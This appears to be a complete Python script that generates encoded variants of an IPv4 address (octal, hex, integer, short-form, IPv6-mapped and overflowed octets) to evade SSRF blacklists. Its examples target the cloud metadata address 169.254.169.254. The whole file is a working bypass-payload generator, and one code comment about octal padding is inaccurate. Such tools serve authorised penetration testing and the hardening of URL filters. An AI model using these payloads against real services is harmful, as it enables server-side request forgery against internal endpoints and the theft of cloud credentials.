#!/usr/bin/env python3
"""
IP Octet Encoder - generates alternate numeric encodings of an IPv4 address,
one octet at a time, for testing SSRF blacklist bypasses.

Usage:
    python3 ip_octet_encoder.py 169.254.169.254
    python3 ip_octet_encoder.py 169.254.169.254 --all-combos
"""

import argparse
import itertools
import sys


def encode_octet(value: int):
    """Return a dict of {encoding_name: encoded_string} for a single octet (0-255)."""
    return {
        "decimal":        str(value),
        "octal_0prefix":  "0" + format(value, "o"),      # e.g. 0251
        "octal_4digit":   "0" + format(value, "o").zfill(3),  # e.g. 0169 style padding
        "hex_0x":         "0x" + format(value, "x"),     # e.g. 0xa9
        "hex_0X":         "0X" + format(value, "X"),     # e.g. 0XA9
        "zero_padded":    format(value, "03d"),           # e.g. 169 -> 169, 5 -> 005
    }


def parse_ip(ip: str):
    parts = ip.strip().split(".")
    if len(parts) != 4:
        raise ValueError("IP must have exactly 4 octets (IPv4 only)")
    octets = []
    for p in parts:
        n = int(p)
        if not 0 <= n <= 255:
            raise ValueError(f"Octet out of range: {p}")
        octets.append(n)
    return octets


def generate_single_octet_variants(octets):
    """
    For each octet position, keep the other three as plain decimal and
    substitute every encoding into that one position. Mirrors the
    'encode 1 octet at a time' bypass technique.
    """
    results = []
    for pos in range(4):
        encodings = encode_octet(octets[pos])
        for enc_name, enc_val in encodings.items():
            if enc_name == "decimal":
                continue  # skip the no-op case
            variant = [str(o) for o in octets]
            variant[pos] = enc_val
            results.append((f"octet{pos+1}->{enc_name}", ".".join(variant)))
    return results


def generate_whole_ip_variants(octets):
    """
    Whole-IP numeric/representation variants: decimal integer, hex integer,
    octal integer, short-form (dropped-octet) addresses, IPv6-mapped forms,
    trailing dot, and CIDR suffix. All values computed from the parsed
    octets, never hard-coded, to avoid transcription errors.
    """
    a, b, c, d = octets
    as_int = (a << 24) | (b << 16) | (c << 8) | d
    dotted = f"{a}.{b}.{c}.{d}"

    # Short-form addresses (valid inet_aton syntax): merge trailing octets
    # into a single larger number.
    short_3part = f"{a}.{b}.{(c << 8) | d}"          # a.b.cd (16-bit tail)
    short_2part = f"{a}.{(b << 16) | (c << 8) | d}"  # a.bcd (24-bit tail)

    # IPv6-mapped forms: group the 4 octets into two 16-bit hex groups.
    hex_group1 = format((a << 8) | b, "x")
    hex_group2 = format((c << 8) | d, "x")

    return {
        "decimal_int":          str(as_int),
        "hex_int_0x_lower":     "0x" + format(as_int, "x"),
        "hex_int_0x_upper":     "0X" + format(as_int, "X"),
        "octal_int":            "0" + format(as_int, "o"),
        "short_form_3part":     short_3part,
        "short_form_2part":     short_2part,
        "ipv6_mapped_dotted":   f"::ffff:{dotted}",
        "ipv6_mapped_hex":      f"::ffff:{hex_group1}:{hex_group2}",
        "ipv6_mapped_bracket":  f"[::ffff:{dotted}]",
        "trailing_dot":         dotted + ".",
        "cidr_32_suffix":       dotted + "/32",
    }


def generate_octet_overflow_variants(octets):
    """
    Per-octet integer overflow: add 256 to one octet at a time so the
    value is out of the normal 0-255 range but still equals the original
    octet modulo 256. Some parsers accept out-of-range octets and wrap
    them, silently reconstructing the original IP.
    """
    results = []
    for pos in range(4):
        overflowed = list(octets)
        overflowed[pos] = octets[pos] + 256
        assert overflowed[pos] % 256 == octets[pos]  # sanity check: wraps correctly
        variant = ".".join(str(o) for o in overflowed)
        results.append((f"octet{pos + 1}->overflow+256", variant))
    return results


def generate_all_combinations(octets):
    """
    Generate every combination of encodings across all 4 octets
    (decimal + octal + hex + zero-padded per octet). This grows fast
    (encodings^4), so use sparingly.
    """
    per_octet_options = [list(encode_octet(o).items()) for o in octets]
    results = []
    for combo in itertools.product(*per_octet_options):
        names = [c[0] for c in combo]
        values = [c[1] for c in combo]
        if all(n == "decimal" for n in names):
            continue  # skip the plain original IP
        results.append((".".join(names), ".".join(values)))
    return results


def main():
    parser = argparse.ArgumentParser(
        description="Generate alternate octet encodings of an IPv4 address for SSRF blacklist testing."
    )
    parser.add_argument("ip", help="IPv4 address to encode, e.g. 169.254.169.254")
    parser.add_argument(
        "--all-combos",
        action="store_true",
        help="Generate every combination across all 4 octets (large output).",
    )
    args = parser.parse_args()

    try:
        octets = parse_ip(args.ip)
    except ValueError as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)

    if args.all_combos:
        variants = generate_all_combinations(octets)
    else:
        variants = generate_single_octet_variants(octets)
        variants += list(generate_whole_ip_variants(octets).items())
        variants += generate_octet_overflow_variants(octets)

    seen = set()
    for _, value in variants:
        if value in seen:
            continue
        seen.add(value)
        print(value)


if __name__ == "__main__":
    main()
